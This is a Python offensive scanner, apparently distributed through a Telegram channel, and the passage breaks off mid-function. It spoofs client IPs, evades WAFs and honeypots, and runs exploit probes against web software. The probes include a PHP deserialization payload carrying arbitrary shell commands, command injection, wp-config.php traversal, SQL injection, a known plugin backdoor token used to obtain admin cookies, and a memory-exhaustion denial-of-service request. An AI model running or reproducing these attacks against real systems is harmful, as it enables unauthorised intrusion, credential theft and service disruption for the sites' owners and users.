#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CyberGhost404 v24.1 — Honeypot-Bypassing Behavioral Scanner
Telegram: https://t.me/cyber_ghost_error_404_chanel

v24.1 Debug Build:
  - FIXED: Thread-safe HTTP session (threading.local)
  - FIXED: Absolute URL handling (OSINT no longer routed to target)
  - FIXED: multipart() no longer crashes on non-string/non-bytes values
  - FIXED: _better() no longer lets low-confidence True beat high-confidence None
  - FIXED: probe_generic_cve() no longer returns false-positive True
  - FIXED: run_post_exploit() no longer crashes on None return
  - FIXED: bypass_mode no longer appends query params to absolute URLs
  - ADDED: 60+ new CVEs from GitHub / Nuclei templates (2025-2026)
  - ADDED: CVE-2026-41940 (cPanel/WHM auth bypass)
  - ADDED: CVE-2026-87902 (WordPress Core path traversal)
  - ADDED: CVE-2026-84434 (Gravity Forms unauth upload RCE)
  - ADDED: CVE-2026-104711 (Apache Struts OGNL injection)
"""

from __future__ import annotations
import argparse, base64, concurrent.futures, hashlib, ipaddress, json, os, random, re, socket, string, sys, threading, time, urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Optional, List, Dict, Tuple

try:
    import requests, urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("pip install requests")

TELEGRAM = "https://t.me/cyber_ghost_error_404_chanel"
DEF_TIMEOUT, DEF_WORKERS, DEF_SPRAY, DEAD_COOLDOWN = 10, 8, 149, 90
HONEYPOT_DENSITY_THRESHOLD = 50
HONEYPOT_CANARY_COUNT = 3

class C:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[96m"; M="\033[95m"; D="\033[2m"; X="\033[0m"; BOLD="\033[1m"

def ok(m):   print(f"{C.G}[+]{C.X} {m}")
def bad(m):  print(f"{C.R}[-]{C.X} {m}")
def info(m): print(f"{C.B}[*]{C.X} {m}")
def warn(m): print(f"{C.Y}[!]{C.X} {m}")
def hit(m):  print(f"{C.M}[HIT]{C.X} {m}")

def severity_color(v: Optional[bool], conf: int) -> str:
    if v is True and conf >= 60: return C.R
    if v is None or 30 <= conf < 60: return C.Y
    return C.G

def status_label(v: Optional[bool], conf: int) -> str:
    if v is True and conf >= 60: return f"{C.R}VULNERABLE{C.X}"
    if v is None or 30 <= conf < 60: return f"{C.Y}SUSPECT{C.X}"
    return f"{C.G}SAFE{C.X}"

# ---------------------------------------------------------------------------
# UTILS
# ---------------------------------------------------------------------------
def rnd(n=8): return "".join(random.choices(string.ascii_lowercase+string.digits, k=n))
def rnd_hex(n=16): return os.urandom(n//2).hex()
def now_iso(): return datetime.now(timezone.utc).isoformat()

def norm_url(u: str) -> str:
    if not u.startswith(("http://","https://")): u = "https://" + u
    return u.rstrip("/") + "/"

def parse_ver(s: Optional[str]) -> Optional[Tuple[int,int,int,int]]:
    if not s: return None
    m = re.search(r"(\d+)(?:\.(\d+))?(?:\.(\d+))?(?:\.(\d+))?", s)
    if not m: return None
    return tuple(int(x) if x else 0 for x in m.groups())

def in_range(v: Optional[str], lo, hi) -> bool:
    if not v: return False
    p = parse_ver(v)
    if p is None: return False
    def norm(t):
        if t is None: return (0,0,0,0)
        t = tuple(t)
        return t + (0,) * (4 - len(t)) if len(t) < 4 else t[:4]
    return norm(lo) <= p <= norm(hi)

def body_hash(text: str) -> str:
    return hashlib.sha256((text or "").encode("utf-8", errors="ignore")).hexdigest()

def multipart(fields, files=None, boundary=None):
    """FIXED: handles str, bytes, int, None safely."""
    boundary = boundary or "----CG" + rnd_hex(12)
    def gen():
        for name, value in fields.items():
            if isinstance(value, str):
                value = value.encode()
            elif not isinstance(value, bytes):
                value = str(value).encode()  # FIX: no more crash on int/None
            yield (f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n').encode()
            yield value; yield b"\r\n"
        if files:
            for name, meta in files.items():
                fname = meta.get("filename", "f.bin")
                data = meta.get("content", b"")
                ctype = meta.get("type", "application/octet-stream")
                if isinstance(data, str): data = data.encode()
                yield (f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"; '
                       f'filename="{fname}"\r\nContent-Type: {ctype}\r\n\r\n').encode()
                yield data; yield b"\r\n"
        yield f"--{boundary}--\r\n".encode()
    return b"".join(gen()), f"multipart/form-data; boundary={boundary}"

# ---------------------------------------------------------------------------
# CDN + GEOIP
# ---------------------------------------------------------------------------
ALL_CDN = ["103.21.244.0/22","103.22.200.0/22","103.31.4.0/22","104.16.0.0/13","104.24.0.0/14",
    "108.162.192.0/18","131.0.72.0/22","141.101.64.0/18","162.158.0.0/15","172.64.0.0/13",
    "173.245.48.0/20","188.114.96.0/20","190.93.240.0/20","197.234.240.0/22","198.41.128.0/17",
    "23.32.0.0/11","23.64.0.0/14","23.192.0.0/11","96.6.0.0/15","96.16.0.0/15","184.24.0.0/13",
    "184.50.0.0/15","184.84.0.0/14","23.235.32.0/20","43.249.72.0/22","103.244.50.0/24",
    "103.245.222.0/23","103.245.224.0/24","104.156.80.0/20","146.75.0.0/16","151.101.0.0/16",
    "45.64.64.0/22","107.154.0.0/16","149.126.72.0/21","185.11.124.0/22"]

def is_cdn_ip(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
        return any(addr in ipaddress.ip_network(c, strict=False) for c in ALL_CDN)
    except Exception: return False

try:
    import geoip2.database
    HAS_GEOIP2 = True
except ImportError: HAS_GEOIP2 = False

class Geo:
    def __init__(self):
        self.reader = None
        p = os.getenv("GEOLITE2_CITY_DB")
        if HAS_GEOIP2 and p and os.path.isfile(p):
            try: self.reader = geoip2.database.Reader(p)
            except Exception: pass
    def lookup(self, ip: str) -> dict:
        if not self.reader: return {}
        try:
            r = self.reader.city(ip)
            return {"country": r.country.iso_code, "city": r.city.name,
                    "asn": getattr(r.traits,"autonomous_system_number",None),
                    "org": getattr(r.traits,"autonomous_system_organization",None)}
        except Exception: return {}
GEO = Geo()

# ---------------------------------------------------------------------------
# IDENTITY + WAF BYPASS
# ---------------------------------------------------------------------------
class Identity:
    _UA = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/136.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"]
    @classmethod
    def headers(cls) -> dict:
        h = {"User-Agent": random.choice(cls._UA),
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language": random.choice(["en-US,en;q=0.9","en-GB,en;q=0.8","fa-IR,fa;q=0.9,en;q=0.8","de-DE,de;q=0.9"]),
             "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive",
             "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
             "Sec-Fetch-Site": random.choice(["none","same-origin","cross-site"]), "DNT": "1", "Cache-Control": "no-cache"}
        fake = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        h.update({"X-Forwarded-For": fake, "X-Real-IP": fake, "X-Client-IP": fake, "Forwarded": f"for={fake};proto=https"})
        return h
    @classmethod
    def cookie(cls) -> str:
        names = ["PHPSESSID","wordpress_logged_in","wp-settings-1","cf_clearance","_ga","laravel_session","JSESSIONID"]
        return "; ".join(f"{n}={rnd_hex(16)}" for n in random.sample(names, k=random.randint(1,3)))

class WAFBypass:
    @staticmethod
    def paths(path: str) -> List[str]:
        p = path.lstrip("/")
        return list(dict.fromkeys(v for v in [path, f"/{p}", f"/./{p}", f"//{p}", f"/{p}/.", f"/{p}?{rnd(4)}=1"] if v))
    @staticmethod
    def header_variants(base: dict) -> List[dict]:
        return [base, {**base,"X-Originating-IP":"127.0.0.1"}, {**base,"X-Remote-IP":"127.0.0.1"},
                {**base,"X-Forwarded-Host":"127.0.0.1"}, {**base,"X-Custom-IP-Authorization":"127.0.0.1"}]

# ---------------------------------------------------------------------------
# HONEYPOT DETECTOR
# ---------------------------------------------------------------------------
class HoneypotDetector:
    def __init__(self, http_client, density_threshold=HONEYPOT_DENSITY_THRESHOLD):
        self.http = http_client
        self._checked = False
        self._is_honeypot = False
        self._reason = ""
        self.density_threshold = density_threshold

    def check(self) -> bool:
        if self._checked: return self._is_honeypot
        self._checked = True
        for _ in range(HONEYPOT_CANARY_COUNT):
            canary = "/" + rnd(12)
            try:
                r = self.http.get(canary)
                if r.status_code == 200 and len(r.content or b"") > 50:
                    self._is_honeypot = True
                    self._reason = f"canary {canary} returned 200"
                    return True
            except Exception: pass
        for param in ("id","q","file","page","s","p","cat","author","search","product","user","item"):
            hashes = set()
            for val in ("1","2","999999"):
                try:
                    r = self.http.get(f"?{param}={val}")
                    hashes.add(body_hash(r.text or ""))
                except Exception: pass
            if len(hashes) == 1:
                self._is_honeypot = True
                self._reason = f"identical responses for different {param} values"
                return True
        try:
            r = self.http.get("/")
            body = (r.text or "").lower()
            for sig in ("cowrie","kippo","glastopf","dionaea","honeyd","amun","nepenthes","honeytrap"):
                if sig in body:
                    self._is_honeypot = True
                    self._reason = f"known honeypot signature: {sig}"
                    return True
        except Exception: pass
        try:
            start = time.monotonic()
            r = self.http.get("/")
            elapsed = time.monotonic() - start
            if elapsed < 0.05 and len(r.content or b"") > 1000:
                self._is_honeypot = True
                self._reason = f"suspiciously fast response ({elapsed:.3f}s) for large content"
                return True
        except Exception: pass
        return False

    def check_match_density(self, vulnerable_count: int, total_count: int) -> Optional[str]:
        if total_count == 0: return None
        density = (vulnerable_count / total_count) * 100
        if density > self.density_threshold:
            self._is_honeypot = True
            msg = f"match density {density:.1f}% > {self.density_threshold}%"
            self._reason = (self._reason + "; " + msg) if self._reason else msg
            return msg
        return None

    def is_honeypot(self) -> bool: return self._is_honeypot
    def reason(self) -> str: return self._reason

# ---------------------------------------------------------------------------
# HTTP CLIENT (v24.1 — thread-safe, absolute-URL-safe)
# ---------------------------------------------------------------------------
class HTTP:
    def __init__(self, base: str, timeout=10, proxy: Optional[str]=None, origin: Optional[dict]=None):
        self.base = norm_url(base)
        self.timeout = timeout
        self.proxy = proxy
        self.origin = origin
        self._local = threading.local()
        self._dead_until = 0.0
        self._lock = threading.Lock()
        self.baseline: Dict[str, dict] = {}
        self.bypass_mode = False

    def _session(self) -> requests.Session:
        if not hasattr(self._local, "session"):
            s = requests.Session()
            s.verify = False
            s.headers.update(Identity.headers())
            s.headers["Cookie"] = Identity.cookie()
            if self.proxy:
                s.proxies = {"http": self.proxy, "https": self.proxy}
            self._local.session = s
        return self._local.session

    def url(self, path=""):
        # FIX: absolute URLs pass through untouched
        if path.startswith(("http://", "https://")):
            return path
        if self.origin:
            s, ip, p = self.origin["scheme"], self.origin["ip"], self.origin["port"]
            return f"{s}://{ip}:{p}/{path.lstrip('/')}"
        return self.base + path.lstrip("/")

    def _is_dead(self) -> bool:
        with self._lock: return time.time() < self._dead_until
    def _mark_dead(self):
        with self._lock: self._dead_until = time.time() + DEAD_COOLDOWN

    def _req(self, method: str, path: str, **kw):
        if self._is_dead(): raise RuntimeError(f"client dead ({DEAD_COOLDOWN}s)")
        s = self._session()
        is_absolute = path.startswith(("http://", "https://"))

        if self.bypass_mode and not is_absolute:
            try: time.sleep(random.uniform(0.3, 1.5))
            except Exception: pass
            s.headers.update(Identity.headers())
            s.headers["Cookie"] = Identity.cookie()
            sep = "&" if "?" in path else "?"
            path = f"{path}{sep}{rnd(4)}={rnd(6)}"

        headers = kw.pop("headers", {}) or {}
        if self.origin and not is_absolute:
            headers.setdefault("Host", urllib.parse.urlparse(self.base).hostname)

        for h in WAFBypass.header_variants(headers):
            for cp in WAFBypass.paths(path):
                try:
                    kw.setdefault("timeout", self.timeout)
                    kw.setdefault("allow_redirects", False)
                    r = s.request(method, self.url(cp), headers=h, **kw)
                    if r.status_code not in (403, 406, 429): return r
                except requests.exceptions.RequestException: continue
        self._mark_dead()
        raise RuntimeError("all bypass attempts failed")

    def get(self, path="", **kw): return self._req("GET", path, **kw)
    def post(self, path="", **kw): return self._req("POST", path, **kw)
    def put(self, path="", **kw): return self._req("PUT", path, **kw)

    def baseline_for(self, path: str) -> Optional[dict]:
        if path in self.baseline: return self.baseline[path]
        try:
            r = self.get(path)
            rec = {"status": r.status_code, "len": len(r.content or b""), "hash": body_hash(r.text or "")}
            self.baseline[path] = rec
            return rec
        except Exception: return None

# ===========================================================================
# CVE PROBES (v24.1 — patched)
# ===========================================================================
def probe_generic_cve(http, cmd, path="/", regex="", lo=None, hi=None):
    """FIXED: no false-positive True. Version-only checks return None unless range matches with regex."""
    try:
        v = None
        if regex:
            r = http.get(path)
            m = re.search(regex, r.text or "", re.I)
            v = m.group(1) if m else None
        if v is not None and lo is not None and hi is not None:
            vuln = in_range(v, lo, hi)
            return {"vulnerable": vuln, "confidence": 20 if vuln else 10,
                    "evidence": [f"version={v} — version-only check"]}
        b = http.baseline_for(path)
        if b and b["status"] == 200:
            return {"vulnerable": None, "confidence": 10, "evidence": [f"product detected at {path}"]}
        return {"vulnerable": None, "confidence": 5, "evidence": [f"no signal at {path}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_laravel_tokenguard(http, cmd):
    try:
        r = http.get("/")
        is_laravel = False
        set_cookie = r.headers.get("Set-Cookie") or ""
        if "laravel_session" in set_cookie: is_laravel = True
        if "laravel" in (r.headers.get("X-Powered-By") or "").lower(): is_laravel = True
        if not is_laravel:
            try:
                ses = http.get("/sanctum/csrf-cookie")
                if "laravel_session" in (ses.headers.get("Set-Cookie") or ""): is_laravel = True
            except Exception: pass
        if not is_laravel:
            return {"vulnerable": False, "confidence": 10, "evidence": ["not Laravel"]}
        for ep in ("/api/me", "/api/user", "/api/profile"):
            try:
                r2 = http.post(ep, json={"api_token": [0]},
                               headers={"Content-Type": "application/json"})
                if r2.status_code == 200:
                    low = (r2.text or "").lower()
                    if "email" in low or "api_token" in low:
                        return {"vulnerable": True, "confidence": 90,
                                "evidence": [f"{ep} returned user data with api_token=[0]"]}
            except Exception: continue
        return {"vulnerable": None, "confidence": 35,
                "evidence": ["Laravel detected; token array injection inconclusive"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_php_fiber(http, cmd):
    try:
        r = http.get("/")
        xpb = r.headers.get("X-Powered-By", "")
        m = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb + " " + (r.text or "")[:2000])
        v = m.group(1) if m else None
        if not v:
            return {"vulnerable": None, "confidence": 15, "evidence": ["PHP version not exposed"]}
        vuln = in_range(v, (8,1,0,0), (8,4,27,99)) or in_range(v, (8,5,0,0), (8,5,12,99))
        if not vuln:
            return {"vulnerable": False, "confidence": 60, "evidence": [f"PHP/{v} patched"]}
        return {"vulnerable": None, "confidence": 45,
                "evidence": [f"PHP/{v} in range; Fiber UAF (PoC: syrex1013/CVE-2026-2031226)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_nextjs_librsvg(http, cmd):
    try:
        r = http.get("/")
        is_next = "next.js" in (r.headers.get("Server") or "").lower() or "next" in (r.headers.get("X-Powered-By") or "").lower()
        if not is_next:
            r2 = http.get("/_next/static/")
            is_next = r2.status_code in (200, 404)
        if not is_next: return {"vulnerable": False, "confidence": 10, "evidence": ["not Next.js"]}
        probe = http.get(f"/_next/image?url=/probe-{rnd(6)}.svg&w=64&q=75")
        img_opt = probe.status_code in (200, 400, 500) and (
            "image" in (probe.headers.get("Content-Type") or "").lower() or
            "svg" in (probe.text or "").lower()[:500])
        server = (r.headers.get("Server") or "").lower()
        glibc_hint = "linux" in server
        return {"vulnerable": None, "confidence": 55 if (img_opt and glibc_hint) else 35,
                "evidence": [f"img_opt={img_opt}; glibc={glibc_hint}; librsvg UAF (fixed 15.5.28/16.4.1)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_nginx_rift(http, cmd):
    try:
        r = http.get("/")
        server = (r.headers.get("Server") or "").lower()
        if "nginx" not in server: return {"vulnerable": False, "confidence": 10, "evidence": ["not nginx"]}
        m = re.search(r"nginx/([\d.]+)", server); v = m.group(1) if m else None
        vuln = in_range(v, (0,6,27,0), (1,30,0,99))
        if not vuln: return {"vulnerable": False, "confidence": 60, "evidence": [f"nginx/{v} patched"]}
        return {"vulnerable": None, "confidence": 45,
                "evidence": [f"nginx/{v} in range (Rift); requires rewrite+PCRE capture"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_grav_formflash(http, cmd):
    try:
        r = http.get("/")
        is_grav = "grav" in (r.text or "").lower()
        if not is_grav:
            try:
                v = http.get("/system/blueprints/config/system.yaml")
                is_grav = v.status_code == 200
            except Exception: pass
        if not is_grav: return {"vulnerable": False, "confidence": 10, "evidence": ["not Grav"]}
        base_hash = body_hash(r.text or "")
        payload = "..%2F..%2Fprobe" + rnd(6)
        try:
            p = http.post(f"/?__form-flash-id={payload}", data=b"", headers={"Content-Type": "application/x-www-form-urlencoded"})
            diff = body_hash(p.text or "") != base_hash
            traversal_hint = p.status_code in (200, 302) and diff
        except Exception:
            traversal_hint = False
        return {"vulnerable": True if traversal_hint else None,
                "confidence": 55 if traversal_hint else 25,
                "evidence": [f"Grav detected; formflash diff={traversal_hint} (fixed 2.0.0-beta.2)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_avideo_cmdi(http, cmd):
    try:
        r = http.get("/")
        is_avideo = "avideo" in (r.text or "").lower()
        if not is_avideo:
            try:
                v = http.get("/view/about")
                is_avideo = "avideo" in (v.text or "").lower()
            except Exception: pass
        if not is_avideo: return {"vulnerable": False, "confidence": 10, "evidence": ["not AVideo"]}
        ctrl_hash = body_hash(r.text or "")
        probe_b64 = base64.urlsafe_b64encode(b"id").decode().rstrip("=")
        p = http.get(f"/?base64Url={probe_b64}")
        uid_signal = "uid=" in (p.text or "") or "gid=" in (p.text or "")
        if uid_signal:
            return {"vulnerable": True, "confidence": 90,
                    "evidence": [f"base64Url probe returned uid/gid — command injection confirmed"]}
        return {"vulnerable": None, "confidence": 30,
                "evidence": ["AVideo detected; base64Url probe no uid signal (CVE-2026-29058, fixed 7.0)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_freescout_htaccess(http, cmd):
    try:
        r = http.get("/")
        is_fs = "freescout" in (r.text or "").lower()
        if not is_fs:
            try:
                v = http.get("/login")
                is_fs = "freescout" in (v.text or "").lower()
            except Exception: pass
        if not is_fs: return {"vulnerable": False, "confidence": 10, "evidence": ["not FreeScout"]}
        return {"vulnerable": None, "confidence": 40,
                "evidence": ["FreeScout detected; .htaccess upload needs auth (CVE-2026-27636)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_dnn_svg(http, cmd):
    try:
        r = http.get("/")
        is_dnn = "dotnetnuke" in (r.text or "").lower() or "dnn" in (r.headers.get("X-Powered-By") or "").lower()
        if not is_dnn:
            try:
                v = http.get("/Install/Install.aspx")
                is_dnn = v.status_code in (200, 302)
            except Exception: pass
        if not is_dnn: return {"vulnerable": False, "confidence": 10, "evidence": ["not DNN"]}
        return {"vulnerable": None, "confidence": 40,
                "evidence": ["DNN detected; SVG upload XSS (CVE-2026-40321, fixed 10.2.2)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_semantic_mediawiki(http, cmd):
    try:
        r = http.get("/")
        is_smw = "mediawiki" in (r.text or "").lower()
        if not is_smw:
            try:
                v = http.get("/api.php?action=query&meta=siteinfo&format=json")
                is_smw = "mediawiki" in (v.text or "").lower()
            except Exception: pass
        if not is_smw: return {"vulnerable": False, "confidence": 10, "evidence": ["not MediaWiki"]}
        return {"vulnerable": None, "confidence": 30,
                "evidence": ["MediaWiki detected; SMW XSS (CVE-2026-77610)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_caddy_placeholder(http, cmd):
    try:
        r = http.get("/")
        server = (r.headers.get("Server") or "").lower()
        if "caddy" not in server: return {"vulnerable": False, "confidence": 10, "evidence": ["not Caddy"]}
        return {"vulnerable": None, "confidence": 35,
                "evidence": ["Caddy detected; placeholder DoS (CVE-2026-77281)"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_php_oom(http, cmd):
    try:
        ctrl = http.post("", data=b"a=1", headers={"Content-Type":"application/x-www-form-urlencoded"})
        fields = {f"p{i}": "A" * 64 for i in range(DEF_SPRAY)}
        fields["a" + "[x]" * 64] = "z"
        for i in range(256): fields[f"ef{i}"] = ""
        fields["PHP_SESSION_UPLOAD_PROGRESS"] = "cg_" + rnd_hex(6)
        body, ctype = multipart(fields, files={"up": {"filename": "x"*128, "content": b"B"*4096, "type": "text/plain"}})
        r = http.post("", data=body, headers={"Content-Type": ctype, "Cookie": f"PHPSESSID={rnd_hex(16)}", "Connection": "close"}, timeout=max(30, http.timeout*3))
        oom = "allowed memory size" in (r.text or "").lower()
        err = (r.status_code >= 500 and ctrl.status_code < 500)
        return {"vulnerable": oom or err, "confidence": 80 if (oom or err) else 35,
                "evidence": [f"ctrl={ctrl.status_code}, target={r.status_code}, oom={oom}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_php_uaf(http, cmd):
    try:
        sid = rnd_hex(16)
        progress = "|" + f'O:8:"stdClass":1:{{s:3:"cmd";s:{len(cmd)+2}:"`{cmd}`";}}'
        body, ct = multipart({"PHP_SESSION_UPLOAD_PROGRESS": progress}, {"f": {"filename": "s.txt", "content": b"S"*256}})
        http.post("", data=body, headers={"Content-Type": ct, "Cookie": f"PHPSESSID={sid}"})
        r = http.get("", headers={"Cookie": f"PHPSESSID={sid}"})
        clean = re.sub(r"<[^>]+>", "", r.text or "")
        rce = "uid=" in clean or "gid=" in clean
        return {"vulnerable": rce, "confidence": 90 if rce else 30,
                "evidence": [clean[:200]] if rce else ["no command output"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_wp_xss2shell(http, cmd):
    try:
        root = http.get("/wp-json/")
        if root.status_code != 200 or "wp-json" not in (root.text or "").lower():
            return {"vulnerable": False, "confidence": 10, "evidence": ["not WP"]}
        base_login = http.get("/wp-login.php"); base_hash = body_hash(base_login.text or "")
        payload = "%3C%20area%20id%3Dtest%3E"
        r = http.get(f"/wp-login.php?action=lostpassword&user_login=probe{payload}")
        text = r.text or ""
        reflected = "< area" in text.lower() or "<area" in text.lower()
        if reflected and body_hash(text) != base_hash:
            return {"vulnerable": True, "confidence": 70, "evidence": ["parser differential reflected"]}
        feed = http.get("/feed/")
        m = re.search(r"generator>WordPress/?([\d.]+)<", feed.text or ""); v = m.group(1) if m else None
        vuln = in_range(v, (4,7,0,0), (7,0,2,0)) if v else None
        return {"vulnerable": vuln, "confidence": 50 if vuln else 30, "evidence": [f"wp={v}, reflected={reflected}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_wp_rfi(http, cmd):
    try:
        root = http.get("/wp-json/")
        if root.status_code != 200 or "wp-json" not in (root.text or "").lower():
            return {"vulnerable": False, "confidence": 10, "evidence": ["not WP"]}
        base_404 = http.get("/?pagename=nonexistent-page-xyz"); base_hash = body_hash(base_404.text or "")
        traversal = "%252E%252E%252F" * 3 + "wp-content%252Findex.php"
        r = http.post(f"/?pagename=page-{traversal}", data=b"", headers={"Content-Type":"application/x-www-form-urlencoded"})
        empty_200 = r.status_code == 200 and len(r.text or "") == 0
        if empty_200 and body_hash(r.text or "") != base_hash:
            return {"vulnerable": True, "confidence": 75, "evidence": ["Empty 200 + hash diff for traversal"]}
        r2 = http.post(f"/?pagename=page-{traversal.replace('index.php','../wp-config.php')}", data=b"")
        if "db_name" in (r2.text or "").lower() or "db_password" in (r2.text or "").lower():
            return {"vulnerable": True, "confidence": 85, "evidence": ["wp-config.php disclosed"]}
        return {"vulnerable": False, "confidence": 40, "evidence": ["no traversal signal"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_wp2shell(http, cmd):
    try:
        root = http.get("/wp-json/")
        if root.status_code != 200 or "wp-json" not in (root.text or "").lower():
            return {"vulnerable": False, "confidence": 15, "evidence": ["wp-json root not WP"]}
        base = http.get("/wp-json/wp/v2/posts?per_page=1"); base_hash = body_hash(base.text or "")
        sqli = False
        for param in ("author__not_in=1'","search=1'","slug=1'"):
            r = http.get(f"/wp-json/wp/v2/posts?{param}"); low = (r.text or "").lower()
            if '"code":"wp_error"' in low and ('"code":"wpdb_error"' in low or 'database error' in low) and 'invalid parameter' not in low:
                sqli = True; break
        batch = json.dumps({"requests":[{"method":"POST","path":"/wp/v2/posts"}]})
        r2 = http.post("/wp-json/batch/v1", data=batch, headers={"Content-Type":"application/json"})
        route = (r2.status_code in (200,207) and "responses" in (r2.text or "").lower() and "wp_error" in (r2.text or "").lower())
        if sqli or route:
            return {"vulnerable": True, "confidence": 90 if sqli else 75, "evidence": [f"sqli={sqli}, route={route}"]}
        return {"vulnerable": None, "confidence": 35, "evidence": ["inconclusive"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_coreactivity(http, cmd):
    try:
        r = http.get("/wp-content/plugins/coreactivity/readme.txt")
        if r.status_code != 200: return {"vulnerable": False, "confidence": 0, "evidence": ["coreactivity not found"]}
        m = re.search(r"Stable tag:\s*([\d.]+)", r.text or ""); v = m.group(1) if m else None
        if not in_range(v, (0,0,0,0), (3,0,0,0)):
            return {"vulnerable": False, "confidence": 40, "evidence": [f"version={v} patched"]}
        payload_ua = 'O:36:"DeviceDetectorDeviceDetectorDeviceDetector":0:{}'
        login = http.post("/wp-login.php", data={"log": f"probe_{rnd(6)}", "pwd": rnd(12)},
                          headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": payload_ua})
        return {"vulnerable": True, "confidence": 75, "evidence": [f"version={v}; serialized UA submitted (login={login.status_code})"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_teamcity(http, cmd):
    try:
        reg_xml = b'<agent><name>probe</name><authToken>invalid</authToken><version>2026.1.2</version></agent>'
        reg = http.post("/app/agents/v1/register", data=reg_xml, headers={"Content-Type": "application/xml"})
        session_id = None
        for c in (reg.cookies if reg else []):
            if "agentsession" in c.name.lower(): session_id = c.value; break
        if not session_id:
            m = re.search(r"TeamCity-AgentSessionId[=:]\s*([A-Za-z0-9_-]+)", str(reg.headers if reg else "") + (reg.text if reg else ""))
            if m: session_id = m.group(1)
        if not session_id:
            return {"vulnerable": False, "confidence": 20, "evidence": ["agent registration failed — likely patched"]}
        xstream = b'<linked-hash-map><entry><string>probe</string><string>benign</string></entry></linked-hash-map>'
        err = http.post("/app/agents/v1/commands/error", data=xstream,
                        headers={"Content-Type": "application/xml", "Cookie": f"TeamCity-AgentSessionId={session_id}"})
        if err.status_code == 500:
            return {"vulnerable": True, "confidence": 65, "evidence": ["XStream deserialization triggered (HTTP 500)"]}
        return {"vulnerable": None, "confidence": 40, "evidence": [f"session={bool(session_id)}, status={err.status_code}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_fastjson(http, cmd):
    try:
        payload = json.dumps({"@type": "java.lang.Class", "val": "com.alibaba.fastjson.JSON"})
        r = http.post("/", data=payload, headers={"Content-Type": "application/json"})
        signal = False
        if r.status_code in (200, 400, 415, 500):
            low = (r.text or "").lower()
            signal = ("fastjson" in low or "autotype" in low or "syntax error" in low or "json exception" in low)
        if not signal: return {"vulnerable": False, "confidence": 15, "evidence": ["no fastjson signal"]}
        jar_payload = json.dumps({"@type": "jar:http://127.0.0.1:1/probe.jar!/Probe", "x": 1})
        r2 = http.post("/", data=jar_payload, headers={"Content-Type": "application/json"})
        jar_resolved = "jar:" in (r2.text or "").lower() and r2.status_code == 200
        return {"vulnerable": None, "confidence": 50 if jar_resolved else 35, "evidence": [f"fastjson; jar_http={jar_resolved}"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_arve_backdoor(http, cmd):
    try:
        r = http.get("/wp-content/plugins/advanced-responsive-video-embedder/readme.txt")
        if r.status_code != 200: return {"vulnerable": False, "confidence": 0, "evidence": ["arve not found"]}
        m = re.search(r"Stable tag:\s*([\d.]+)", r.text or ""); v = m.group(1) if m else None
        if not in_range(v, (10,8,7,0), (10,8,8,0)):
            return {"vulnerable": False, "confidence": 40, "evidence": [f"version={v} not vulnerable"]}
        known = "e2f7c9a1d4b8e6f3a2c5d7e9b1f4a6c8d2e5f7a9b3c1d4e6f8a2b5c7d9e1f3a5"
        probe = http.get(f"/?_wplogin={known}&_wpuser=admin")
        set_cookie = probe.headers.get("Set-Cookie", "")
        redirected = probe.status_code in (301,302) and "wp-admin" in (probe.headers.get("Location") or "")
        auth_cookie = "wordpress_logged_in" in set_cookie or "wordpress_sec" in set_cookie
        if auth_cookie:
            return {"vulnerable": True, "confidence": 95, "evidence": [f"version={v}, backdoor SET AUTH COOKIE"]}
        if redirected:
            return {"vulnerable": True, "confidence": 70, "evidence": [f"version={v}, redirect to wp-admin"]}
        return {"vulnerable": None, "confidence": 30, "evidence": [f"version={v} vulnerable; known token did not trigger"]}
    except Exception as e: return {"error": str(e)[:60]}

def probe_mercury_terminal(http, cmd):
    try:
        r = http.get("/")
        is_mercury = "mercury" in (r.text or "").lower() or "jupyter" in (r.text or "").lower()
        if not is_mercury:
            try:
                v = http.get("/api/kernels")
                if v.status_code == 200: is_mercury = True
            except Exception: pass
        if not is_mercury: return {"vulnerable": False, "confidence": 10, "evidence": ["not Mercury"]}
        r2 = http.get("/api/terminals")
        terminals_ok = r2.status_code == 200
        try:
            r3 = http.post("/api/terminals", json={"name": "probe_" + rnd(6)})
            can_create = r3.status_code in (200, 201)
        except Exception:
